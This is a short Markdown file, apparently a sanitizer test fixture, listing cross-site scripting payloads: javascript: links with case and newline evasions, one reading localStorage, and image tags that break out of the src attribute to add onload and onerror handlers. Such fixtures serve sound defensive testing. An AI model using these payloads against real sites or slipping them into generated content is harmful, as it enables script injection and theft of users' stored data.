# VALID XSS

## Links

[Basic](javascript:alert('Basic'))

[Local Storage](javascript:alert(JSON.stringify(localStorage)))

[CaseInsensitive](JaVaScRiPt:alert('CaseInsensitive'))

[URL](javascript://www.google.com%0Aalert('URL'))

[In Quotes]('javascript:alert("InQuotes")')

## Images

![Escape SRC - onload](https://www.example.com/image.png"onload="alert('ImageOnLoad'))

![Escape SRC - onerror]("onerror="alert('ImageOnError'))